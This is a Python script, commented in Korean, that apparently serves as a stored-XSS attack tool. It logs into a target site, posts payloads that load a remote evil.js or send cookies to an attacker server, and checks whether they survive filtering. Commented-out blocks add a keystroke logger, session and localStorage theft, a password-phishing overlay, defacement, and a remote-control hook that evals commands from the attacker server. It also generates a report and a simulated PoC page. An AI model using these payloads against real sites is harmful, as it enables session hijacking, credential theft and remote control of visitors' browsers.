import requests
from bs4 import BeautifulSoup
import time
import json
import re
from datetime import datetime
import random
import base64
import os

class XSSAttackTool:
    def __init__(self, target_url, attacker_server):
        self.target_url = target_url.rstrip('/')
        self.attacker_server = attacker_server.rstrip('/')
        self.session = requests.Session()
        self.logged_in = False
        self.vulnerabilities = []
        self.successful_payloads = []

    def login(self, username="bob", password="bobby123"):
        """타겟 사이트 로그인"""
        login_url = f"{self.target_url}/login.php"

        print(f"[*] Attempting login with {username}/{password}")

        data = {'username': username, 'password': password}
        response = self.session.post(login_url, data=data, allow_redirects=True)

        if 'index.php' in response.url:
            print("[+] Login successful!")
            self.logged_in = True
            return True
        else:
            print("[-] Login failed!")
            return False
        
    def generate_xss_payloads(self):
        """다양한 XSS 페이로드 생성"""

        # 파일 다운로드를 위한 base64 인코딩된 데이터
        file_content = "이 컴퓨터는 이제 제 껍니다. 제 마음대로 할 수 있는 겁니다."
        file_b64 = base64.b64encode(file_content.encode('utf-8')).decode('utf-8')


        # <script> 태그 막힘. 밑에 다른 페이로드 첨부
#         payloads = [
#             # 1. 기본 쿠키 탈취 + 파일 다운로드
#             {
#                 'name': 'Cookie Theft + File Download',
#                 'payload': f'''<sCrIPt>
# // 쿠키 탈취
# new Image().src='{self.attacker_server}/steal?cookie='+document.cookie;

# // 파일 자동 다운로드
# setTimeout(function(){{
#     var a = document.createElement('a');
#     var file = new Blob([atob('{file_b64}')], {{type: 'text/plain;charset=utf-8'}});
#     a.href = URL.createObjectURL(file);
#     a.download = '리버스 쉘이라면.txt';
#     document.body.appendChild(a);
#     a.click();
#     document.body.removeChild(a);
# }}, 1000);
# </sCrIPt>'''
#             },

#             # 2. 키로거 + 세션 하이재킹
#             {
#                 'name': 'Keylogger + Session Hijack',
#                 'payload': f'''<sCrIPt>
# // 키로거 설치
# var keylog = '';
# document.onkeypress = function(e){{
#     keylog += e.key;
#     if(keylog.length > 20){{
#         new Image().src = '{self.attacker_server}/keylog?k=' + btoa(keylog);
#         keylog = '';
#     }}
# }};

# // 세션 정보 수집
# var data = {{
#     cookies: document.cookie,
#     localStorage: JSON.stringify(localStorage),
#     sessionStorage: JSON.stringify(sessionStorage),
#     url: window.location.href
# }};
# fetch('{self.attacker_server}/session', {{
#     method: 'POST',
#     body: JSON.stringify(data)
# }});
# </sCrIPt>'''
#             },

#             # 3. 자동 포인트 전송 (CSRF) (건뛰)

#             # 4. 피싱 폼 삽입
#             {
#                 'name': 'Phishing Form Injection',
#                 'payload': f'''<sCrIPt>
# // 가짜 로그인 폼
# var phishForm = `
# <div id="phish" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;">
#     <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:30px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.5);">
#         <h2 style="color:#333;margin-bottom:20px;">세션이 만료되었습니다</h2>
#         <p style="color:#666;margin-bottom:15px;">계속하려면 다시 로그인하세요</p>
#         <input type="password" id="phish_pwd" placeholder="비밀번호" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:5px;">
#         <button onclick="stealPwd()" style="width:100%;padding:10px;background:#4CAF50;color:white;border:none;border-radius:5px;cursor:pointer;">로그인</button>
#     </div>
# </div>`;
# document.body.innerHTML += phishForm;

# window.stealPwd = function(){{
#     var pwd = document.getElementById('phish_pwd').value;
#     new Image().src = '{self.attacker_server}/phish?p=' + pwd;
#     document.getElementById('phish').remove();
#     alert('로그인되었습니다!');
# }};
# </sCrIPt>'''
#             },

# #             # 5. 전체 페이지 변조
# #             {
# #                 'name': 'Full Page Defacement',
# #                 'payload': f'''<sCrIPt>
# # setTimeout(function(){{
# #     document.body.innerHTML = `
# #     <div style="text-align:center;padding:50px;background:#000;color:#0f0;height:100vh;">
# #         <h1 style="font-size:50px;margin-bottom:30px;">HACKED BY XSS</h1>
# #         <p style="font-size:20px;margint-bottom:20px;">이 사이트는 XSS 취약점이 있습니다</p>
# #         <p style="font-size:16px;color:#f00;">이 사이트는 이제 제 껍니다. 제 마음대로 할 수 있는 겁니다.</p>
# #     </div>`;
# # }}, 3000);
# # </sCrIPt>'''
# #             },

#             # 6. BeEF 스타일 훅
#             {
#                 'name': 'Browser Hook',
#                 'payload': f'''<sCrIPt>
# // 브라우저 제어
# (function(){{
#     // 브라우저 정보 수집
#     var info = {{
#         userAgent: navigator.userAgent,
#         platform: navigator.platform,
#         language: navigator.language,
#         screen: screen.width + 'x' + screen.height,
#         cookies: document.cookie,
#         location: window.location.href
#     }};

#     // 명령 실행 함수
#     window.execCmd = function(cmd){{
#         try{{ eval(cmd); }}catch(e){{ console.error(e); }}
#     }};

#     // 서버와 연결
#     setInterval(function(){{
#         fetch('{self.attacker_server}/hook?info=' + btoa(JSON.stringify(info)))
#             .then(r => r.text())
#             .then(cmd => {{ if(cmd) execCmd(cmd); }});
#     }}, 5000);
# }})();
# </sCrIPt>'''
#             }
#         ]

        payloads = [
            # 1. Evil.js 로드 (가장 중요!)
            {
                'name': 'Evil.js Full Payload',
                'payload': f'<img src=x onerror="s=document.createElement(\'script\');s.src=\'{self.attacker_server}/evil.js\';document.body.appendChild(s)">'
            },

            # 4. 직접 쿠키 탈취
            {
                'name': 'Direct Cookie Theft',
                'payload': f'<img src=x onerror="new Image().src=\'{self.attacker_server}/steal?c=\'+document.cookie">'
            }
        ]

        return payloads
    
    def test_xss_injection(self, payloads):
        """XSS 페이로드 주입 테스트"""
        if not self.logged_in:
            print("[-] Login required!")
            return False
        
        post_url = f"{self.target_url}/new_post.php"
        success_count = 0

        print("\n[*] Testing XSS payloads...")

        for i, payload_info in enumerate(payloads, 1):
            try:
                print(f"\n[{i}/{len(payloads)}] Testing: {payload_info['name']}")
                print(f"    Payload length: {len(payload_info['payload'])} bytes")

                # 게시글 작성
                data = {'content': payload_info['payload']}
                response = self.session.post(post_url, data=data, allow_redirects=True)

                if 'index.php' in response.url:
                    # 게시글 확인
                    time.sleep(1)
                    check = self.session.get(f"{self.target_url}/index.php")

                    # XSS 코드가 필터링되지 않고 들어갔는지 확인
                    if any(indicator in check.text.lower() for indicator in ['<script', 'onerror=', 'onload=', 'onmouseover=']):
                        print(f"    [+] SUCCESS! XSS payload injected!")
                        success_count += 1

                        self.successful_payloads.append({
                            'name': payload_info['name'],
                            'payload': payload_info['payload'][:100] + '...',
                            'full_payload': payload_info['payload']
                        })

                        self.vulnerabilities.append({
                            'type': 'XSS',
                            'severity': 'CRITICAL',
                            'payload': payload_info['name'],
                            'impact': 'Cookie theft, Keylogging, Phishing, File download, Full control'
                        })
                    else:
                        print(f"    [-] Payload filtered or encoded")
            except Exception as e:
                print(f"    [-] Error: {str(e)}")

        print(f"\n[*] XSS Test Complete: {success_count}/{len(payloads)} successful")
        return success_count > 0
    
    def generate_report(self):
        """공격 결과 리포트 생성"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        report = f"""
===================================================
        XSS Attack Report
===================================================
Target: {self.target_url}
Attacker Server: {self.attacker_server}
Timestamp: {timestamp}
===================================================

Successful XSS Payloads: {len(self.successful_payloads)}

"""
        for i, payload in enumerate(self.successful_payloads, 1):
            report += f"{i}. {payload['name']}\n"
            report += f"    Payload: {payload['payload']}\n\n"

        report += "\nFull Payloads:\n"
        report += "=" * 50 + "\n\n"

        for i, payload in enumerate(self.successful_payloads, 1):
            report += f"{i}. {payload['name']}\n"
            report += "-" * 30 + "\n"
            report += f"{payload['full_payload']}\n"
            report += "\n" + "=" * 50 + "\n\n"

        # 리포트 파일 저장
        report_dir = "xss_report"
        os.makedirs(report_dir, exist_ok=True)
        report_filename = f"xss_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        report_path = os.path.join(report_dir, report_filename)
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(report)

        print(f"\n[+] Report saved: {report_filename}")
        return report_filename
    
    def generate_poc_page(self):
        """PoC 페이지 생성"""
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - 리버스 쉘 시뮬레이션</title>
    <meta charset="utf-8">
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
            margin: 0;
        }}
        .container {{
            max-width: 1000px;
            margin: 0 auto;
        }}
        .header {{
            text-align: center;
            padding: 30px;
            border-bottom: 2px solid #00ff00;
            margin-bottom: 30px;
        }}
        h1 {{
            font-size: 3em;
            text-shadow: 0 0 20px #00ff00;
            animation: glow 2s ease-in-out infinite alternate;
        }}
        @keyframes glow {{
            from {{ text-shadow: 0 0 20px #00ff00; }}
            to {{ text-shadow: 0 0 30px #00ff00, 0 0 40px #00ff00; }}
        }}
        .attack-box {{
            background: #1a1a1a;
            border: 2px solid #00ff00;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
        }}
        .attack-box h3 {{
            color: #ffff00;
            margin-bottom: 15px;
        }}
        button {{
            background: #00ff00;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-size: 1.1em;
            cursor: pointer;
            margin: 10px;
            font-weight: bold;
            transition: all 0.3s;
        }}
        button:hover {{
            background: #000;
            color: #00ff00;
            border: 2px solid #00ff00;
        }}
        .log {{
            background: #000;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid #00ff00;
            height: 200px;
            overflow-y: auto;
            font-size: 0.9em;
        }}
        .warning {{
            color: #ff0000;
            font-weight: bold;
            text-align: center;
            margin: 20px 0;
            font-size: 1.2em;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>XSS Attack PoC</h1>
            <p>리버스 쉘 시뮬레이션 & 파일 다운로드</p>
            <p class="warning">⚠️ 교육 목적으로만 사용하세요 ⚠️</p>
        </div>
        
        <div class="attack-box">
            <h3>1. 쿠키 탈취 + 파일 다운로드</h3>
            <button onclick="attack1()">실행</button>
            <p>현재 쿠키를 탈취하고 악성 파일을 다운로드합니다.</p>
        </div>
        
        <div class="attack-box">
            <h3>2. 키로거 설치</h3>
            <button onclick="attack2()">설치</button>
            <p>모든 키 입력을 기록합니다. 설치 후 아무 키나 입력해보세요.</p>
        </div>
        
        <div class="attack-box">
            <h3>3. 가짜 로그인 폼</h3>
            <button onclick="attack3()">피싱 공격</button>
            <p>가짜 로그인 창을 띄워 비밀번호를 탈취합니다.</p>
        </div>
        
        <div class="attack-box">
            <h3>4. 전체 페이지 변조</h3>
            <button onclick="attack4()">페이지 해킹</button>
            <p>전체 페이지를 변조합니다.</p>
        </div>
        
        <div class="attack-box">
            <h3>5. 브라우저 제어</h3>
            <button onclick="attack5()">브라우저 훅</button>
            <p>브라우저를 원격 제어합니다.</p>
        </div>
        
        <div class="log" id="log">
            <div>[*] XSS PoC 준비 완료...</div>
        </div>
    </div>
    
    <script>
        function log(message) {{
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.textContent = '[' + new Date().toTimeString().split(' ')[0] + '] ' + message;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }}
        
        function downloadFile() {{
            const content = "이 컴퓨터는 이제 제 껍니다. 제 마음대로 할 수 있는 겁니다.";
            const blob = new Blob([content], {{type: 'text/plain;charset=utf-8'}});
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = '리버스 쉘이라면.txt';
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
            log('[+] 파일 다운로드 완료: 리버스 쉘이라면.txt');
        }}
        
        function attack1() {{
            log('[*] 쿠키 탈취 시작...');
            log('[+] 쿠키 정보: ' + document.cookie);
            log('[*] 공격자 서버로 전송 중...');
            setTimeout(() => {{
                log('[+] 쿠키 전송 완료');
                log('[*] 악성 파일 다운로드 시작...');
                downloadFile();
            }}, 1000);
        }}
        
        function attack2() {{
            log('[*] 키로거 설치 중...');
            document.onkeypress = function(e) {{
                log('[KEYLOG] 키 입력 감지: ' + e.key);
            }};
            log('[+] 키로거 설치 완료! 아무 키나 눌러보세요.');
            downloadFile();
        }}
        
        function attack3() {{
            log('[*] 피싱 폼 생성 중...');
            const phishForm = `
            <div id="phish" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;">
                <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#1a1a1a;padding:30px;border:2px solid #00ff00;border-radius:10px;">
                    <h2 style="color:#00ff00;margin-bottom:20px;">세션 만료</h2>
                    <p style="color:#fff;margin-bottom:15px;">보안을 위해 다시 로그인하세요</p>
                    <input type="password" id="phish_pwd" placeholder="비밀번호" style="width:100%;padding:10px;margin-bottom:10px;background:#000;color:#0f0;border:1px solid #0f0;">
                    <button onclick="stealPwd()" style="width:100%;padding:10px;background:#00ff00;color:#000;border:none;cursor:pointer;">로그인</button>
                </div>
            </div>`;
            document.body.innerHTML += phishForm;
            
            window.stealPwd = function() {{
                const pwd = document.getElementById('phish_pwd').value;
                log('[+] 비밀번호 탈취: ' + pwd);
                document.getElementById('phish').remove();
                downloadFile();
            }};
            log('[+] 피싱 폼 표시됨');
        }}
        
        function attack4() {{
            log('[*] 페이지 변조 시작...');
            setTimeout(() => {{
                document.body.innerHTML = `
                <div style="text-align:center;padding:50px;background:#000;color:#0f0;height:100vh;">
                    <h1 style="font-size:50px;margin-bottom:30px;text-shadow:0 0 20px #0f0;">HACKED BY XSS</h1>
                    <p style="font-size:20px;margin-bottom:20px;">이 사이트는 XSS 취약점이 있습니다</p>
                    <p style="font-size:16px;color:#f00;">이 컴퓨터는 이제 제 껍니다. 제 마음대로 할 수 있는 겁니다.</p>
                    <button onclick="location.reload()" style="margin-top:30px;padding:15px 30px;font-size:18px;background:#0f0;color:#000;border:none;cursor:pointer;">원래대로</button>
                </div>`;
            }}, 1000);
            downloadFile();
        }}
        
        function attack5() {{
            log('[*] 브라우저 훅 설치 중...');
            log('[+] 브라우저 정보 수집...');
            log('    - User Agent: ' + navigator.userAgent);
            log('    - Platform: ' + navigator.platform);
            log('    - Language: ' + navigator.language);
            log('    - Screen: ' + screen.width + 'x' + screen.height);
            log('[+] 원격 제어 활성화됨');
            log('[*] 5초마다 공격자 서버와 통신 중...');
            downloadFile();
            
            setInterval(() => {{
                log('[*] Beacon 전송: ' + new Date().toTimeString().split(' ')[0]);
            }}, 5000);
        }}
    </script>
</body>
</html>"""
        
        page_dir = "xss_report"
        os.makedirs(page_dir, exist_ok=True)
        page_filename = f"xss_poc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        page_path = os.path.join(page_dir, page_filename)
        with open(page_path, 'w', encoding='utf-8') as f:
            f.write(html_content)

        print(f"[+] XSS PoC page saved: {page_filename}")

    def run(self):
        """XSS 공격 실행"""
        print("\n" + "="*50)
        print("         XSS Attack Tool v1.0")
        print("="*50)
        print(f"Target: {self.target_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print("="*50)

        # 1. 로그인
        if not self.login():
            print("[-] Login failed. Exiting...")
            return
        
        # 2. XSS 페이로드 생성
        payloads = self.generate_xss_payloads()
        print(f"\n[*] Generated {len(payloads)} XSS payloads")

        # 3. XSS 테스트
        if self.test_xss_injection(payloads):
            print("\n[+] XSS vulnerabilities found!")

            # 4. 리포트 생성
            self.generate_report()

            # 5. PoC 페이지 생성
            self.generate_poc_page()

            print("\n[*] Attack complete!")
            print("[*] Check the following files:")
            print(" - xss_report_*.txt : Attack report")
            print(" - xss_poc_*.html : Interactive PoC page")
            print("\n[!] File '리버스 쉘이라면.txt' will be downloaded when victims visit the infected page")
        else:
            print("\n[-] No XSS vulnerabilities found")


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 3:
        print("Usage: python3 xss_tool.py <target_url> <attacker_server>")
        print("Example: python3 xss_tool.py http://vulnerable.com https://attacker.com")
        sys.exit(1)

    target = sys.argv[1]
    attacker = sys.argv[2]

    # XSS 공격 도구 실행
    xss_tool = XSSAttackTool(target, attacker)
    xss_tool.run()